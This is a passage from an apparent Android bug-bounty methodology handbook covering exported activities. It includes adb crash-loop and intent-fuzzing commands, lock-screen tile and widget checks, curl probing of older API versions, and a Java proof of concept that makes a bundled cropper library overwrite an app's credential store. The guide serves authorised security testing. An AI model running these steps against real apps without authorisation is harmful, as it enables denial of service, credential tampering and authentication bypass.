  the component you then test as an arbitrary-activity-start gadget. On a modern build, a `setContentIntent`
  PendingIntent built with `FLAG_MUTABLE` and no component set.
- **Escalation:** -> D08 (PendingIntent mutability and intent redirection), -> D24 (push delivering the
  trigger). The notification tap becomes an attacker-steerable launch into any activity you name.
- **Ruled out when:** No trampoline line appears on any notification tap, **and** every `setContentIntent` /
  `addAction` PendingIntent is built with `FLAG_IMMUTABLE` and an explicit component — note that
  PendingIntent mutability is unenforced below targetSdk 31, so a sub-31 target requires reading every
  construction site rather than trusting the default.

### D04-060 · Null-intent and type-confusion fuzzing as a triage-ordering signal, not a finding

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | `application_level_denial_of_service_dos.app_crash.malformed_android_intents` (**P5**) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | Android Hacker's Handbook ("Null-Intent fuzzing is nearly free"); Google Invalid Reports, "App crashes"; Grab and Spotify both: "Crashes due to malformed Intents sent to exported Activity/Service/BroadcastReceiver **(exploiting these for sensitive data leakage is commonly in scope)**"; Xiaomi out-of-scope: "Sending malformed intents to the exported component causes the APP to crash only" |

- **Test:** Send null, absent and wrong-typed extras to every exported activity. An unhandled
  `NullPointerException` or `ClassCastException` is **not** the vulnerability. It is a reliable marker that
  the component validates nothing — which is precisely where the exported-component and intent-redirection
  bugs live. Use it to order your reading queue.
- **How:**
  ```bash
  adb logcat -c -b crash
  adb shell am start -n com.target.app/.Target                          # no extras at all
  adb shell am start -n com.target.app/.Target --es expected_int_key notanint
  adb shell am start -n com.target.app/.Target --ei expected_str_key 1
  adb shell am start -n com.target.app/.Target --esn nullextra
  adb shell am start -n com.target.app/.Target -d "content://x"
  adb shell am start -n com.target.app/.Target --es a "$(python3 -c 'print("A"*100000)')"
  adb logcat -d -b crash -v threadtime | grep -A20 -iE 'FATAL EXCEPTION|NullPointerException|ClassCastException|NumberFormatException'
  ```
  Drive the loop from Python, not a shell array, and print a count — a shell loop that fails silently
  produces a "clean" result you will believe.
- **Proof:** A crash stack in `logcat -b crash` naming the component's own class as the first app frame.
  Record it; do **not** file it.
- **Escalation:** Read what the component does with the extra it crashed on — that parameter is your
  attacker-controlled input for D04-010, -> D08, -> D10 and -> D11. Google's own wording is the licence:
  exploiting the same malformed intent for **sensitive data leakage** is commonly in scope even where the
  crash is not.
- **Ruled out when:** No exported component crashes across the full extra matrix **and** your loop printed a
  row count matching `components × payloads`. A silent loop is not a negative.

### D04-061 · Persistent crash loop — the only DoS shape in this domain that is payable

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `application_level_denial_of_service_dos.app_crash.malformed_android_intents` is **P5**; to be paid you must move it to `application_level_denial_of_service_dos.high_impact_and_or_medium_difficulty` (**P3**) or `.critical_impact_and_or_easy_difficulty` (**P2**) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | H1 #65729 ("Activities are not Protected and able to crash app using other app"), #1061211 ("[Java] CWE-755: Query to detect Local Android DoS caused by NFE"); AOSP rates "Local persistent denial of service (permanent, requiring reflashing the entire operating system, or factory reset)" as **High** and "Local temporary denial of service … resolved by rebooting the device or uninstalling the triggering app" as NSI; Meta prices persistent DoS at up to $5,000 against $500 temporary; Google notes a bug "that leads to the app crashing every time it is started … might be eligible … as an abuse-related Denial of Service attack" |

- **Test:** A one-shot crash the user dismisses is informational. The payable version is one where the bad
  value is **persisted** and re-read at launch, so the app crash-loops on its own launcher activity until the
  user clears data or reinstalls.
- **How:**
  ```bash
  for c in $(adb shell dumpsys package com.target.app | grep -oE 'com\.target\.app/[A-Za-z0-9_.$]+'); do
    adb shell am start -n "$c" --es a "$(python3 -c 'print("A"*100000)')"; sleep 1
  done
  adb logcat -d | grep -E 'FATAL EXCEPTION|AndroidRuntime'
  # the part that decides whether this is a finding:
  adb shell am force-stop com.target.app && adb shell am start -n com.target.app/.MainActivity
  adb reboot && adb wait-for-device && adb shell am start -n com.target.app/.MainActivity
  adb shell run-as com.target.app ls -l shared_prefs/ files/
  ```
- **Proof:** The app crash-looping on its own launcher activity **after** `force-stop` and **after** a
  reboot, plus the persisted file that causes it shown on disk. Without the persisted file the report is a
  P5.
- **Escalation:** Pair with D04-011, which is how the poisoned value usually gets written. If the crash is a
  memory-safety fault in a native library, stop DoS-hunting and go to -> D16 — an attacker-controlled fault
  address is an entirely different report.
- **Ruled out when:** Every crash is transient: the app starts cleanly after `force-stop` with no poisoned
  state on disk. Record the `force-stop` + relaunch as the negative.

### D04-062 · Exported-component crash as a process-restart primitive

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | `application_level_denial_of_service_dos.app_crash.malformed_android_intents` (P5) alone |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | HackTricks `android-applications-basics.md` ("other exported components that crash on `intent.getData()`, missing extras, or bad casts, giving you a **restart primitive**"); Hrishikesh C08 item 4; the bugscale Samsung S25 chain, where `com.samsung.android.iap.receiver.IapReceiver` forced a restart so a `new Random(System.currentTimeMillis())` challenge seed could be brute-forced inside a ±200 ms window |

- **Test:** The real value of a crash is that it **restarts the process at a moment you choose**, resetting
  any process-lifetime RNG, cache or first-launch code path that another component depends on.
- **How:**
  ```bash
  adb shell pidof com.target.app
  adb shell am start -n com.target.app/.CrashyActivity          # no data, no extras
  adb shell pidof com.target.app                                # changed => you control restarts
  grep -rnE 'new Random\(|System\.currentTimeMillis\(\)|SecureRandom\(\)' out/sources/
  ```
- **Proof:** `FATAL EXCEPTION` attributable to the component **and** `pidof` returning a different value —
  the pair proves you have a restart oracle rather than just a crash.
- **Escalation:** Predictable restart -> predictable seed -> brute-forceable challenge -> auth bypass
  (-> D12/D05). Also re-running a first-launch code path that skips a check, or resetting a rate-limit
  counter held in memory (-> D13).
- **Ruled out when:** The crash does not change the pid (the component runs in a separate process that the
  rest of the app does not depend on), **and** no security-relevant value is seeded from process start —
  verified by reading every `Random`/`SecureRandom` construction site and finding no time-seeded one.

### D04-063 · The app's own launcher entry can be disabled by an attacker-reachable path

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `application_level_denial_of_service_dos.high_impact_and_or_medium_difficulty` (P3) for the availability half |
| **Attacker** | AM-03 |
| **Applies to** | From **Android 10** the OS shows a synthesised launcher entry pointing at the app's settings page unless the app is a system app, requests no permissions, has no launcher activity, or is in a managed device/work-profile context — so full concealment is **LEGACY** except in those four carve-outs, which are exactly where to test it |
| **Maps to** | ATT&CK T1628.001 Suppress Application Icon ("Hiding the application's icon programmatically does not require any special permissions"), T1628, detection DET0640/AN1715 which correlates "visibility reductions (icon suppression, launcher disablement) with continued application execution" |

- **Test:** Can any exported component — or the app's own logic driven by an attacker-controlled extra —
  reach `PackageManager.setComponentEnabledSetting` and disable the launcher activity or its alias?
- **How:**
  ```bash
  grep -rnE 'setComponentEnabledSetting|COMPONENT_ENABLED_STATE_DISABLED|COMPONENT_ENABLED_STATE_DEFAULT' out/sources/ -B10 \
    | grep -nE 'getIntent|getStringExtra|getBooleanExtra'
  adb shell pm dump com.target.app | grep -nE 'enabled=|disabledComponents'
  ```
  Trigger the path from the zero-permission PoC, then re-dump.
- **Proof:** `pm dump` listing the launcher activity or alias under `disabledComponents` after your trigger,
  and the icon gone from the launcher — with the before/after dumps side by side.
- **Escalation:** -> D05 persistence: a hidden app that still runs at boot is the T1628 + T1624.001 pattern.
  In a legitimate client app the framing is availability and concealment, not malware — rate on the user's
  loss of access.
- **Ruled out when:** No `setComponentEnabledSetting` call is reachable from intent-derived input (every call
  site is driven by an in-app settings toggle), verified by tracing each call site's guard. Also a true
  negative on Android 10+ outside the four carve-outs, where the OS re-synthesises the launcher entry — show
  the synthesised entry in the launcher.

### D04-064 · The activity's backend call is an older API version than the web app uses

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) where the old version accepts no token; `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) or `.modify_view_sensitive_information_iterable_object_identifiers` (P1) for the field-exposure and write regressions |
| **Attacker** | AM-01 / AM-06 (the API is reachable from `curl`) |
| **Applies to** | any versioned API behind a mobile client |
| **Maps to** | claude-bughunter `hunt-shadow-api` Stages 1 & 3 plus its severity table; explicit chain from `apk-redteam-pipeline` |

- **Test:** The highest-value bridge from this chapter into the backend. A mobile app's hardcoded backend
  calls are frequently an **older API version** than the current web app uses, kept alive for old clients and
  never given the same fixes — weaker auth, weaker rate limits, weaker input validation, more field exposure.
  Every endpoint you recovered from an exported activity in D04-007/-010 is a version-diff candidate.
- **How:**
  ```bash
  # the versions the activity actually calls
  grep -rnE 'https?://[^"]+/v[0-9]+/|X-API-Version|Accept: application/vnd' out/sources/ | sort -u
  for v in v1 v2 v3 v4 beta alpha internal legacy old 2022-01-01 2023-01-01 2024-01-01; do
    curl -s -o /dev/null -w "%{http_code} /api/$v/\n" "https://$TARGET/api/$v/"
  done
  curl -s -H "X-API-Version: 1" https://$TARGET/api/users
  curl -s -H "Accept: application/vnd.company.v1+json" https://$TARGET/api/users
  ```
  Then diff **behaviour**, not response shape, for the *same operation* across versions: does v1 accept no
  token, an expired token, or a lower-privilege token that v2 rejects? Does v1 return no `429` under a burst
  that v2 throttles? Does v1 accept a payload v2 validates? Does v1 return internal ids or PII the current
  version redacts?
- **Proof:** The same request against both versions side by side, with a **body** diff — not a status-code
  diff. A byte-identical 200 is not a bypass. For the rate-limit half, sample at least 100 attempts and
  distinguish per-IP, per-account, per-session and per-username throttling before claiming absence; for any
  timing claim, n >= 10 interleaved trials per group with the suspect group's mean >= 2σ above control.
- **Escalation:** -> D15. **A version difference alone is Informational — the weakened control is the
  finding.** Say which control regressed in the title.
- **Ruled out when:** Every version the app can reach enforces the same auth, the same throttle and the same
  field redaction as the current one, demonstrated with the paired requests. An old version that 404s or
  refuses connection is not reachable and is a clean negative; anything else is live.

### D04-065 · Evidence: the five-screenshot pattern for an exported-activity state change

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | governs every state-changing finding in this chapter |
| **Attacker** | n/a |
| **Applies to** | D04-010, -011, -012, -019, -061, -063 and every chained outcome |
| **Maps to** | claude-bughunter `evidence-hygiene` §7 (five-screenshot pattern), §§2, 4, 5, 6, 8 (redaction) |

- **Test:** A state change needs pre-state, the bug, and post-state — plus the out-of-band side effect. An
  exported-activity finding without the post-state reads as a screenshot of a screen.
- **How:** Capture in one sitting, without reloading pages between shots (reloads regenerate cookies and
  invalidate prior captures). Name files `{finding-#}-step{n}-{description}.png` and reference them by
  filename in the report body:
  1. **Pre-state verification** — the victim account showing the original value.
  2. **The bug itself** — the `am start` (or the PoC app's logcat) and the change succeeding without auth.
     This is the most important shot.
  3. **Post-state negative** — the old value no longer valid.
  4. **Post-state positive** — the attacker's value now in force.
  5. **Side effect** — the notification email/inbox, or its absence, which proves whether passive defence
     exists.
  ```bash
  adb exec-out screencap -p > 04-step2-exported-activity-state-change.png
  adb shell screenrecord --time-limit 30 /sdcard/poc.mp4 && adb pull /sdcard/poc.mp4
  ```
  Sanitise the HAR before attaching:
  ```bash
  jq '.log.entries |= map(
    (.request.headers  |= map(if .name|ascii_downcase|IN("cookie","authorization","x-csrf-token") then .value="<REDACTED>" else . end)) |
    (.response.headers |= map(if .name|ascii_downcase|IN("set-cookie") then .value="<REDACTED>" else . end)) |
    (.request.cookies  |= map(.value="<REDACTED>")) |
    (.response.cookies |= map(.value="<REDACTED>")))' in.har > out.sanitized.har
  grep -i 'authorization\|"cookie"' out.sanitized.har | head -20    # verify
  ```
- **Proof:** Five numbered, cross-referenced images plus the PoC APK's `AndroidManifest.xml` showing an
  empty permission set. **Leave visible** what the triager needs to correlate: trace ids
  (`x-request-id`, `x-datadog-trace-id`), your own attacker uid and package name, JSON key names, and
  bot-management/analytics cookies (`__cf_bm`, `_cfuvid`, `_ga`). Mask session cookies, `Authorization`,
  and third-party PII. Rotate the test account's session and password after submission so anything visible
  in a screenshot is dead.
- **Escalation:** This is what converts a D04 primitive into a report a triager can validate without asking
  you a question.
- **Ruled out when:** n/a — this is a standard, not a test. The failure mode it prevents is a
  not-reproducible close on a genuine finding.

### D04-066 · Chain filing: primitives first, consumer second, then backfill

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a |
| **Applies to** | every D04 chain (exported activity -> WebView -> token -> ATO; exported activity -> URI grant -> provider read) |
| **Attacker** | n/a |
| **Maps to** | claude-bughunter `bugcrowd-reporting` §5 and submission-order strategy §8 |

- **Test:** This domain produces primitives, and a chain is a **severity amplifier, not a merge request**.
  One fix equals one bounty; filing a whole chain as a single report gives away the primitives' payouts.
- **How:** (1) Identify the highest-severity chained outcome. (2) File each primitive as its own report at
  its standalone severity — the exported activity (`exported_sensitive_android_intent`), the WebView
  origin-confusion (D10), the token in the file (D11) — each with a placeholder cross-reference line. (3)
  File the chain consumer with the full ATO narrative at the chained severity, filling in the real primitive
  ids. (4) Edit each primitive to backfill the consumer's id. Consumer body:
  ```markdown
  ## Chain partners (filed as separate reports)
  - **submission [UUID-1]** — exported `CheckoutActivity` accepts an arbitrary `checkoutUrl`
  - **submission [UUID-2]** — WebView permits `file://` with JavaScript enabled
  These primitives have independent fix surfaces and are filed separately per the program's
  "one fix = one bounty" rule.
  ```
  On Bugcrowd, pick the most **specific accurate** VRT node and then set Technical Severity manually — never
  select a node that misrepresents the bug to inherit a higher default.
- **Proof:** Cross-referenced ids in both directions.
- **Escalation:** Do not paste the chain narrative into every primitive, do not claim each primitive is
  independently P1, and do not file everything within minutes of each other — triagers read a same-minute
  batch as low-effort spam. Submission order that works: primitives, consumer, clean standalone P3s, then
  anything out-of-scope-risky last.
- **Ruled out when:** n/a — this is a standard.

### D04-067 · The pre-severity gate — run it against the Critical *claim*, not against the bug

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | governs every P1/P2 claim originating in this chapter |
| **Attacker** | n/a |
| **Applies to** | every "exported activity = authentication bypass" claim |
| **Maps to** | claude-bughunter `triage-validation` PRE-SEVERITY GATE and retraction discipline |

- **Test:** Write the draft Critical title, then substitute the Critical claim for "the bug" in each
  question:
  1. Have I validated the **full** chain to attacker-attainable impact, or only one primitive in the middle?
     "The activity rendered" is a primitive, not impact.
  2. What does the attacker walk away with, in one concrete sentence?
  3. Have I personally reproduced the full chain end to end **at least twice** — once during discovery, once
     for the PoC?
  4. Is there still a gate in the chain: a server-side ownership check, a signature check, an audience check,
     the BAL restriction (D04-038)? If yes, it is not Critical — file it as "primitive present" at a lower
     severity.
  5. Has the program rejected this severity class before? (For this domain: Google Mobile VRP rejects
     StrandHogg and tapjacking variants and secondary lockscreen bypasses outright.)
- **How:** Re-run the PoC cold on a freshly-installed build, from the zero-permission APK, on the stock
  non-rooted device, and capture it again. Then apply D04-009 to the API half.
- **Proof:** Two independent end-to-end reproductions, timestamped, with the gate question answered
  explicitly in the report body.
- **Escalation:** When a finding does not survive the gate, write the retraction into the report as a
  retraction appendix rather than silently dropping it — that is what preserves the client's trust in the
  rest of the report. The inverse also holds: **do not retract a confirmed finding that stopped reproducing
  because the client patched mid-engagement.** Keep the timestamped pre-patch evidence and say when it was
  captured.
- **Ruled out when:** n/a — this is a gate. Its failure mode is a retracted Critical against production
  infrastructure, which costs more than the finding was worth.

### D04-068 · Quick Settings `TileService` performs its action, or launches its activity, over the keyguard

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null — rated on what the tile exposes); `broken_authentication_and_session_management.authentication_bypass` (P1) only where the tile reaches account data across a user boundary |
| **Attacker** | AM-10 physical locked |
| **Applies to** | apps shipping a Quick Settings tile; API 24+ for `TileService`, API 34+ for the `startActivityAndCollapse(PendingIntent)` form |
| **Maps to** | `develop/ui/views/quicksettings-tiles` — the docs state directly: "Your tile may display on top of the lock screen on locked devices", and supply `isLocked()`, `isSecure()` and `unlockAndRun(Runnable)` as the guards; MASWE-0023 (Step-Up Authentication Not Implemented) |

- **Test:** A Quick Settings tile is tappable from the shade on a **locked** device. A tile whose `onClick()`
  performs a privileged action — start a transfer, reveal a balance, toggle a security feature, or
  `startActivityAndCollapse` into a screen showing account data — with no `isLocked()`/`isSecure()` guard is
  reachable by anyone with thirty seconds of physical access and no credential. This is the sibling of
  D04-056: `showWhenLocked` is the manifest route to the same boundary, the tile is the user-facing one.
- **How:**
  ```bash
  grep -nA8 'android.service.quicksettings.action.QS_TILE' out/AndroidManifest.xml
  grep -rnE 'class .*TileService|onClick\(|isLocked\(\)|isSecure\(\)|unlockAndRun|startActivityAndCollapse' out/sources/
  ```
  On device: add the tile through the shade editor, set a real PIN, then:
  ```bash
  adb shell input keyevent KEYCODE_SLEEP; adb shell input keyevent KEYCODE_WAKEUP   # locked, screen on
  adb shell cmd statusbar expand-settings
  adb shell uiautomator dump /sdcard/lock.xml && adb pull /sdcard/lock.xml
  adb shell dumpsys window | grep -E 'mDreamingLockscreen|KeyguardController'
  ```
  Tap the tile, then re-dump and diff the two hierarchies.
- **Proof:** The action completing, or the launched activity's own view hierarchy present in
  `uiautomator dump`, while `dumpsys window` shows the keyguard still up. The XML dump is the
  screenshot-independent artefact and survives a `FLAG_SECURE` screen that refuses `screencap`.
- **Escalation:** Pre-unlock reachability plus the deep-link router (D04-058) lets a locked-device attacker
  drive arbitrary in-app routes; pair with D04-071 for the widget surface and D25 for an NFC or
  USB-attach trigger that needs no touch at all.
- **Ruled out when:** `onClick()` calls `isLocked()`/`isSecure()` and routes through `unlockAndRun(...)`
  before any privileged work — verified by tapping the tile while locked and observing the keyguard
  credential prompt appear before anything else happens. A tile that only toggles a non-security preference
  is also a clean negative; record which tile and what it toggles. The app shipping no `QS_TILE` service at
  all is the simplest negative — show the empty `grep`.

### D04-069 · A bundled library's exported activity writes to a caller-supplied `Uri` inside the host app's private storage

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null — rated on the file overwritten); `broken_authentication_and_session_management.authentication_bypass` (P1) where the overwritten file is the session/credential store and you show the resulting auth-state change |
| **Attacker** | AM-03 zero-permission local app; AM-08 where the library itself is the supply-chain vector |
| **Applies to** | apps bundling `com.theartofdev.edmodo:android-image-cropper:2.8.+`, `com.github.arthurhub:android-image-cropper:2.7.0` or `com.vanniktech:android-image-cropper` below 4.7.0 — and, as a class, any library activity that accepts a destination `Uri` from an extra |
| **Maps to** | Oversecured SDK-security write-up — "Unvalidated `customOutputUri` parameter allowed writing to arbitrary paths including credential stores", chain `Bundle extras → Uri.Builder → customOutputUri → overwrites SecureStore.xml`; axeploit/dev.to root-cause analysis of `BitmapUtils.writeBitmapToUri` ("accepts the attacker-controlled Uri and writes to it directly, with no validation of the destination path, the file extension, or whether an existing file would be overwritten"); CanHub CHANGELOG 4.7.0 (2025-11-27) "Security: Added URI validation to prevent file system manipulation (fixes #613)". **No CVE was assigned — say so in the report so triage does not close it on "no CVE".** |

- **Test:** The exported-activity register (D04-001) contains components the app's own developers never
  wrote. A library activity that takes a destination `Uri` from an intent extra and writes to it, without
  confining the destination to the library's own directory, is an arbitrary file write **performed by the
  host app's UID inside the host app's private storage** — reachable from any installed app.
- **How:** Establish presence under every coordinate the family has used, because an SCA rule keyed on one
  `groupId` sees at most a third of a forked library:
  ```bash
  ./gradlew :app:dependencies --configuration releaseRuntimeClasspath > deps.txt
  grep -niE "theartofdev|arthurhub|canhub|vanniktech" deps.txt
  grep -rniE "com\.theartofdev|com\.github\.arthurhub|com\.canhub|com\.vanniktech" \
    --include='*.gradle' --include='*.gradle.kts' --include='*.toml' .
  grep -rn "jitpack.io" --include='*.gradle*' --include='settings.gradle*' .
  # class-level check — survives coordinate renaming and JitPack mirrors of archived forks entirely
  jadx -d out base.apk
  grep -rn "CropImageActivity\|CropImageView\|writeBitmapToUri\|customOutputUri\|CROP_IMAGE_EXTRA_BUNDLE\|CROP_IMAGE_EXTRA_OPTIONS" out/sources/
  grep -n "CropImageActivity" out/AndroidManifest.xml
  ```
  Then drive it from the zero-permission PoC (D04-005):
  ```java
  Intent i = new Intent();
  i.setClassName("com.target.app", "com.canhub.cropper.CropImageActivity");
  Bundle b = new Bundle();
  b.putParcelable("CROP_IMAGE_EXTRA_OPTIONS",
      optionsWithCustomOutputUri(Uri.parse("file:///data/data/com.target.app/shared_prefs/SecureStore.xml")));
  i.putExtra("CROP_IMAGE_EXTRA_BUNDLE", b);
  i.putExtra("CROP_IMAGE_EXTRA_SOURCE", attackerContentUri);
  startActivity(i);
  ```
  Generalise the class beyond this one library — any exported activity whose extras reach a `FileOutputStream`,
  `openOutputStream` or `writeBitmapToUri`:
  ```bash
  grep -rnE 'openOutputStream\(|new FileOutputStream\(|writeBitmapToUri' out/sources/ -B12 \
    | grep -nE 'getIntent\(\)|getParcelableExtra|EXTRA_OUTPUT|outputUri'
  ```
- **Proof:** `stat` or `run-as ls -l` showing the target file's size and mtime changed to your bitmap, plus
  the impact screenshot: the app failing to read its own credential store on next launch (forced logout, or a
  crash naming the store). Take the pre-state capture first — this is a state-change finding and needs the
  five-screenshot pattern (D04-065).
- **Escalation:** Overwriting a SharedPreferences XML holding a session token or a feature flag is an auth
  bypass or a forced logout (-> D13); overwriting a WebView cache or config file is -> D10; the library's
  own read path is -> D07. The abandonment argument is separate and belongs with D02/D17: the ArthurHub
  repository is unmaintained with development halted at 2.8.0, so no advisory stream will ever flag it and
  "our scanner says we're clean" is not evidence.
- **Ruled out when:** The library version in `deps.txt` is at or above the fixed line (CanHub 4.7.0+) **and**
  the class-level `grep` finds no vulnerable class in the dex, **or** the activity is declared
  `android:exported="false"` in the merged manifest and a direct start from the zero-permission PoC returns
  `SecurityException: Permission Denial`. A clean SCA report on its own is never the negative here — the
  class-level grep is.

### D04-070 · Exported engine/player activity whose extras are consumed by game or framework code

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); rises with what the extra controls |
| **Attacker** | AM-03 |
| **Applies to** | Unity Android builds (`com.unity3d.player.UnityPlayerActivity` and subclasses); by extension any engine or framework activity exported as `MAIN`/`LAUNCHER` |
| **Maps to** | Il2CppDumper README (`dump.cs` contains method and field information); MASTG-TECH-0160 |

- **Test:** Engine-hosted apps export a player activity as `MAIN`/`LAUNCHER` by construction, and the
  managed code behind it routinely reads intent extras for deep-link payloads, promo codes and debug flags
  through `AndroidJavaObject`/`currentActivity`. The Java side looks empty in jadx, so the surface is
  routinely closed without being tested — the extras are read in C#, not in Java. Same trap as the Flutter
  router in D04-018.
- **How:**
  ```bash
  grep -n -A15 'com.unity3d.player' out/AndroidManifest.xml
  # recover the managed method/field table, then search it for intent reads
  # (Il2CppDumper over libil2cpp.so + global-metadata.dat produces dump.cs)
  grep -nE 'getIntent|AndroidJavaObject|currentActivity|getStringExtra|getBooleanExtra|Application\.absoluteURL' dump.cs | head -40
  adb shell am start -n com.target.app/com.unity3d.player.UnityPlayerActivity \
    --es promo x4hd2k9pq --ez debug true --ei level 99
  ```
- **Proof:** The `dump.cs` line showing the managed method that reads the extra, paired with an on-device
  behaviour change when the extra is set — and, where the value reaches the server, the request in the proxy
  carrying it. A client-only cheat flag is Low; a flag the server trusts is High.
- **Escalation:** A debug or entitlement flag the backend honours is -> D15 business logic; a URL extra that
  reaches the engine's web view is -> D10; a payload the engine deserialises is -> D17.
- **Ruled out when:** The managed dump contains no intent read reachable from the player activity, verified
  by grepping `dump.cs` for every extra accessor and finding none, **or** every extra the code reads is
  re-validated server-side — proved by setting the extra and observing the server reject or ignore it in the
  proxy. "There is no Java code in `MainActivity`" is never the negative.

### D04-071 · The widget or lock-screen surface renders the account data the in-app screen protects

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `insecure_data_storage.screen_caching_enabled` (P5) as filed; escalate through `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies) on the data class |
| **Attacker** | AM-10 physical locked |
| **Applies to** | apps shipping an `AppWidgetProvider`; especially banking, 2FA, delivery and messaging |
| **Maps to** | no external identifier verified in the corpus for the widget-content path; contrast with MASTG-TEST-0289/-0291 which cover the task snapshot, and `develop/ui/views/quicksettings-tiles` for the sibling tile surface |

- **Test:** The app may set `FLAG_SECURE` on the balance screen and `VISIBILITY_SECRET` on its notifications
  and still draw the same balance, OTP, message preview or delivery address into a home-screen widget — which
  on OEMs that permit keyguard widgets or complications is visible to anyone holding the locked device. The
  widget is drawn by the system process from `RemoteViews`, so none of the in-app protections apply to it.
- **How:**
  ```bash
  grep -rnE 'AppWidgetProvider|RemoteViews\(|setTextViewText|setImageViewBitmap|setPendingIntentTemplate' out/sources/
  adb shell dumpsys appwidget | sed -n '/Provider/,/Host/p'
  # add the widget, then read what it renders without unlocking
  adb shell input keyevent KEYCODE_SLEEP; adb shell input keyevent KEYCODE_WAKEUP
  adb exec-out screencap -p > lockscreen_widget.png
  ```
- **Proof:** `lockscreen_widget.png` showing the balance, OTP or message body, placed **side by side** with
  the black `screencap` of the in-app screen that does set `FLAG_SECURE`. That contrast is the finding: the
  app demonstrably knows the data is sensitive and protects it in one surface and not the other.
- **Escalation:** A widget whose `setPendingIntentTemplate` also performs the action — "pay again", "approve"
  — is a tap-to-transact control on the lock screen; that is -> D23, not a disclosure finding. The
  `PendingIntent` mutability of that template is -> D08.
- **Ruled out when:** The app ships no widget (`dumpsys appwidget` lists no provider for the package), or the
  widget renders only non-sensitive placeholders until tapped and the tap routes through the app lock —
  verified by adding the widget with an account that has a non-zero balance and observing the placeholder. A
  widget that renders real data on the **home** screen only, on a device where the keyguard forbids widgets,
  is a weaker variant: state which surface you reproduced on.

### D04-072 · False-positive discipline for the four claims this chapter makes

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | governs every claim in this chapter |
| **Attacker** | n/a — kill gate |
| **Applies to** | every item above |
| **Maps to** | claude-bughunter `bb-methodology` PART 4 — Marker Discipline, the Body-Diff Rule, the Statistical-Sample Rule, Server-Policy-vs-State and the Shell-Loop Ban; `triage-validation` 7-Question Gate |

- **Test:** This domain produces four claim shapes, and each has a matching false positive that triage knows
  and you must pre-empt.
  1. **"My extra was reflected / accepted."** Word collision. The marker must be random alphanumeric,
     **8 or more characters**, no English words and no protocol keywords — `x4hd2k9pq`, never `test`,
     `AAAA`, `attacker`, `evil`, `payload` or your own domain.
  2. **"The bypass worked."** A status code is not a differential. A `200` whose body is byte-identical to
     the baseline is not a bypass.
  3. **"The overlay lands reliably" / "there is no rate limit on the activity's endpoint".** A single
     favourable run is jitter.
  4. **"The sweep found nothing."** A shell array loop that produced zero iterations prints nothing and looks
     exactly like a clean result.
- **How:**
  ```bash
  # 1. Marker Discipline — search the BASELINE for the marker BEFORE claiming it was accepted
  M=$(head -c 16 /dev/urandom | base64 | tr -dc 'a-z0-9' | head -c 9)
  curl -s "$BASELINE_URL" | grep -c "$M"          # must be 0
  adb shell am start -n com.target.app/.X --es note "$M"
  # 2. Body-Diff Rule
  diff <(curl -s "$URL" -H "Authorization: Bearer $GOOD") <(curl -s "$URL") | head
  # 3. Statistical-Sample Rule — n >= 10 interleaved trials per group, randomised order
  python3 - <<'PY'
  import random, statistics, subprocess
  trials = [("control", c) for c in range(10)] + [("test", t) for t in range(10)]
  random.shuffle(trials)   # interleave; never run the two groups back to back
  # record each run's outcome, then compare means and sigma per group
  PY
  # 4. Shell-Loop Ban — count results, always
  wc -l exported_register.txt sweep_rows.txt      # rows must equal activities x extra-sets
  ```
- **Proof:** For (1), the marker absent from the baseline and present in the test response. For (2), the
  byte-level diff in the report. For (3), the distribution — mean, median and sigma per group, with a signal
  requiring the suspect group's mean at or beyond **2 sigma** from the control's; a single 2x outlier is
  nothing. For (4), a row count that matches the register.
- **Escalation:** Apply Server-Policy-vs-State alongside these: an activity that refuses every extra you send
  is enforcing a fixed policy, not reacting to your input, and that is a negative rather than an
  unexploitable positive. Establish it by sending a value the app *should* accept and confirming the
  behaviour differs.
- **Ruled out when:** n/a — this is a gate. Its failure mode is the four rejected-as-N/A categories:
  marker collision, status-code-only bypass, single-outlier timing, and a silent sweep read as coverage.

## Graveyard for this domain

| Observation | Why it is not a finding | What would make it one |
|---|---|---|
| "The app has exported activities." | Exporting is intended behaviour. Google: it is not a vulnerability "unless it can be used to gain unauthorized access to application data or functionality." | Name the activity, the data it renders or the action it performs, and show a zero-permission caller obtaining it (D04-007, D04-010). |
| "`android:filterTouchesWhenObscured` is missing." | `mobile_security_misconfiguration.tapjacking` is **P5**. MobSF and mobsfscan flag its absence as a good-practice rule, not a vulnerability. | A recording in which an overlay with a demonstrated timing oracle causes a named irreversible action to complete (D04-048, D04-049), filed under the action's category, not tapjacking. |
| "Screenshots are not disabled / the Recents thumbnail shows data." | `insecure_data_storage.screen_caching_enabled` is **P5**; Bugcrowd's own remediation text calls it "a best practice". | A named consumer that reaches the artefact — a `MediaProjection`/accessibility co-resident, or a physical-access narrative — plus the data class (PAN, OTP, seed phrase) (D04-042). |
| "`launchMode="singleTask"` is set / `taskAffinity` is non-default." | The MobSF `task_affinity_set` condition is a *precondition*, not an attack, and both StrandHogg variants are patched at OS level from Android 11. | A reproduction on an in-scope API level with credentials typed into your activity and logged by your package (D04-032), or the modern `allowCrossUidActivitySwitchFromBelow` variant on Android 15 (D04-035). |
| "Sending a malformed intent crashes the app." | `application_level_denial_of_service_dos.app_crash.malformed_android_intents` is **P5**; explicitly out of scope at Xiaomi, Reddit and TikTok. | The crash persisting across `force-stop` and reboot because the bad value was written to disk (D04-061), or the same malformed input reaching a data-leak sink, which Grab and Spotify both say is in scope. |
